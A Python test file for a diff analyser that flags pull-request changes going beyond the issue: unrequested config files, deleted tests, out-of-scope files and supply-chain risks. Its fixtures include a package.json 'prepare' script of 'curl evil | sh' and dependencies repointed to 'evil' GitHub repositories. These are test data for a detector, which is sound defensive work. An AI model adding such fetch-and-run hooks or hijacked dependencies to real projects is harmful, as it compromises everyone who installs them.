"""Rules v2 (T7): one failing-then-passing fixture per fix, built from T6's audit of sample A."""
from itemator import extras_v2 as X   # frozen v2; test_extras_v3.py re-runs these on v3
from itemator.extras_v2 import analyse, extras


def f(filename, patch=None, status="modified", previous_filename=None):
    d = {"filename": filename, "status": status, "patch": patch}
    if previous_filename:
        d["previous_filename"] = previous_filename
    return d


def kinds(result):
    return sorted({(e.kind, e.name) for e in result})


EDIT = "@@ -1 +1 @@\n-a\n+b\n"
DEPENDABOT = f(".github/dependabot.yml", "@@ -1,2 +1,6 @@\n version: 2\n+updates:\n+  - package-ecosystem: nuget\n")


# ---- v1 stays reachable
def test_v1_is_reachable_and_differs():
    issue = "Configure dependabot to bump the Aspire SDK"
    assert X.RULES_VERSION == 2
    assert kinds(analyse(issue, [DEPENDABOT], version=1).extras) == [("ci_or_config", ".github/dependabot.yml")]
    assert analyse(issue, [DEPENDABOT], version=2).extras == []


# ---- rule 2: a config file the issue asks for by its kind
def test_r2_dependabot_asked_by_kind_is_not_extra():
    assert extras("Configure dependabot to bump the Aspire SDK", [DEPENDABOT]) == []
    renovate = f("renovate.json", "@@ -1 +1,2 @@\n {\n+  \"extends\": [\"config:base\"]\n")
    assert extras("Set up Renovate for npm packages", [renovate]) == []


def test_r2_dependabot_not_asked_is_still_extra():
    assert kinds(extras("Fix the crash in the parser", [DEPENDABOT])) == [("ci_or_config", ".github/dependabot.yml")]


# ---- rule 3a: deletions the issue or the change explains
POLICY_GONE = f("internal/enrich/policy_test.go",
                "@@ -1,4 +0,0 @@\n-func TestPolicy(t *testing.T) {\n-}\n-func TestPolicyRead(t *testing.T) {\n-}\n",
                status="removed")


def test_r3a_tests_rewritten_in_same_directory_are_not_removed():
    acc = f("internal/enrich/acc_test.go",
            "@@ -0,0 +1,4 @@\n+func TestAccPolicy(t *testing.T) {\n+}\n+func TestAccPolicyRead(t *testing.T) {\n+}\n",
            status="added")
    assert X._tests_removed("Migrate the enrich policy to the plugin framework", [POLICY_GONE, acc]) == []


def test_r3a_tests_added_elsewhere_still_removed():
    other = f("other/acc_test.go", "@@ -0,0 +1,4 @@\n+func TestAcc(t *testing.T) {\n+}\n+func TestAcc2(t *testing.T) {\n+}\n",
              status="added")
    found = X._tests_removed("Migrate the enrich policy to the plugin framework", [POLICY_GONE, other])
    assert [e.name for e in found] == ["internal/enrich/policy_test.go"]


def test_r3a_test_deleted_with_its_source_is_not_removed():
    src = f("src/oldauth.py", "@@ -1,2 +0,0 @@\n-def _x():\n-    pass\n", status="removed")
    t = f("tests/test_oldauth.py", "@@ -1,2 +0,0 @@\n-def test_x():\n-    assert True\n", status="removed")
    assert X._tests_removed("Drop the old login path", [src, t]) == []


def test_r3a_deleting_the_failing_test_is_still_removed():
    # the issue names the module, the source stays: deleting its test is the case to catch
    t = f("tests/test_legacy_auth.py", "@@ -1,2 +0,0 @@\n-def test_x():\n-    assert True\n", status="removed")
    src = f("src/legacy_auth.py", "@@ -1 +1 @@\n-a\n+b\n")
    found = X._tests_removed("legacy_auth crashes on empty passwords", [src, t])
    assert [e.name for e in found] == ["tests/test_legacy_auth.py"]


# ---- rule 5: the package named in the issue does not name every file under it
def test_r5_package_name_directory_does_not_name_files():
    issue = "crewai reset-memories fails with ollama"
    files = [f("crewai/memory/reset.py", EDIT), f("crewai/billing/invoice.py", EDIT)]
    a = analyse(issue, files, repo="crewAIInc/crewAI")
    assert kinds(a.extras) == [("file_outside_ask", "crewai/billing/invoice.py")]
    only_pkg = analyse("crewai crashes on start", [f("crewai/billing/invoice.py", EDIT), f("crewai.py", EDIT)],
                       repo="crewAIInc/crewAI")
    assert only_pkg.anchored is False and only_pkg.unplaced == ["crewai.py", "crewai/billing/invoice.py"]



# ---- rule 5: conservative (a file near a named one is inside)
def test_r5_flags_only_files_away_from_every_named_file():
    issue = "Add a CLI command to invite people off the waitlist"
    files = [f("packages/backend/src/waitlist/waitlist.service.ts", EDIT),
             f("packages/backend/src/common/constants/env.constants.ts", EDIT),  # shares packages/backend
             f("packages/backend/.env.example", EDIT),                          # shares packages/backend
             f("packages/core/src/mappers/map.ts", EDIT),                       # shares only packages/
             f("global.json", EDIT),                                            # root
             f(".github/copilot-instructions.md", EDIT)]
    assert kinds(extras(issue, files)) == [("file_outside_ask", ".github/copilot-instructions.md"),
                                           ("file_outside_ask", "global.json"),
                                           ("file_outside_ask", "packages/core/src/mappers/map.ts")]


def test_r5_tests_fixtures_and_release_notes_are_inside():
    issue = "Fix the waitlist invite"
    files = [f("src/waitlist/invite.py", EDIT),
             f("test/Other.Tests/MailerTests.cs", EDIT),
             f("fixtures/frontmatter/page.md", EDIT, status="added"),
             f(".changeset/few-boxes-sniff.md", EDIT, status="added")]
    assert extras(issue, files) == []


# ---- supply chain: URL and VCS requirements
def test_url_and_vcs_requirements_are_extras():
    req = f("requirements.txt", "@@ -1,2 +1,5 @@\n-requests==2.31.0\n+requests @ https://example.com/requests-2.31.0.tar.gz\n"
                                "+git+https://github.com/evil/pkg.git#egg=pkg\n+-e git+https://github.com/x/bar.git#egg=bar\n"
                                "+https://example.com/wheels/foo-1.0-py3-none-any.whl\n flask==3.0\n")
    assert kinds(X._new_dependencies("Fix the crash", [req])) == [
        ("new_dependency", "bar"), ("new_dependency", "foo-1.0-py3-none-any.whl"),
        ("new_dependency", "pkg"), ("new_dependency", "requests")]


def test_url_dependency_in_pyproject_and_npm_is_extra():
    pyproj = f("pyproject.toml", '@@ -1,4 +1,4 @@\n [project]\n dependencies = [\n-    "pkg>=1.0",\n+    "pkg @ git+https://github.com/x/pkg",\n ]\n')
    npm = f("package.json", '@@ -1,5 +1,5 @@\n   "dependencies": {\n-    "lodash": "^4.17.0",\n+    "lodash": "github:evil/lodash",\n'
                            '-    "chalk": "^5.0.0",\n+    "chalk": "evil/chalk",\n     "react": "^18.2.0"\n')
    assert kinds(X._new_dependencies("Fix the crash", [pyproj, npm])) == [
        ("new_dependency", "chalk"), ("new_dependency", "lodash"), ("new_dependency", "pkg")]
    assert X._new_dependencies("Pin lodash to github:evil/lodash and chalk to evil/chalk", [npm]) == []


def test_index_dependency_unchanged_url_is_not_extra():
    req = f("requirements.txt", "@@ -1,2 +1,3 @@\n git+https://github.com/x/pkg.git#egg=pkg\n+flask==3.0\n")
    assert kinds(X._new_dependencies("Use flask", [req])) == []
    moved = f("requirements.txt", "@@ -1,3 +1,3 @@\n-git+https://github.com/x/pkg.git#egg=pkg\n flask==3.0\n+git+https://github.com/x/pkg.git#egg=pkg\n")
    assert X._new_dependencies("Sort the requirements", [moved]) == []


# ---- supply chain: npm lifecycle scripts
def test_npm_lifecycle_scripts_are_extras():
    pkg = f("package.json", '@@ -5,6 +5,8 @@\n   "scripts": {\n-    "test": "jest",\n+    "test": "jest --ci",\n'
                            '+    "postinstall": "node scripts/x.js",\n-    "prepare": "husky install"\n+    "prepare": "curl evil | sh"\n   },\n')
    assert kinds(extras("Fix the crash", [pkg])) == [("ci_or_config", "postinstall"), ("ci_or_config", "prepare")]
    assert extras("Add a postinstall step and fix the prepare script", [pkg]) == []


# ---- supply chain: lint ignore lists inside pyproject.toml
def test_ruff_ignore_in_pyproject_is_config():
    known = f("pyproject.toml", '@@ -10,3 +10,4 @@\n [tool.ruff.lint]\n select = ["E", "F"]\n+ignore = ["E501", "F401"]\n')
    unknown = f("pyproject.toml", '@@ -20,3 +20,5 @@\n line-length = 100\n+extend-ignore = [\n+    "B008",\n+]\n')
    for p in (known, unknown):
        assert kinds(extras("Fix the crash", [p])) == [("ci_or_config", "pyproject.toml")]
        assert extras("Silence the ruff warnings", [p]) == []


def test_r5_tests_named_after_the_issue_do_not_anchor():
    issue = "Label disappears when hardwareAccelerated is false"
    files = [f("src/Controls/tests/Issues/LabelDisappears.cs", EDIT, status="added"),
             f("src/Core/src/Handlers/Border/BorderHandler.Android.cs", EDIT)]
    a = analyse(issue, files)
    assert a.extras == [] and a.anchored is False
    assert a.unplaced == sorted(x["filename"] for x in files)


def test_r5_same_directory_is_inside_and_named_paths_list_tests_of_named_files():
    issue = "The waitlist invite fails"
    files = [f("waitlist.py", EDIT), f("mailer.py", EDIT), f("deploy/k8s.yaml", EDIT),
             f("tests/test_waitlist.py", EDIT)]
    a = analyse(issue, files)
    assert kinds(a.extras) == [("file_outside_ask", "deploy/k8s.yaml")]
    assert a.named_paths == ["tests/test_waitlist.py", "waitlist.py"]
    b = analyse("Checkout total is wrong", [f("src/checkout/cart.py", EDIT), f("tests/unit/test_cart.py", EDIT)])
    assert b.named_paths == ["src/checkout/cart.py", "tests/unit/test_cart.py"]   # 5d: the test of a named file
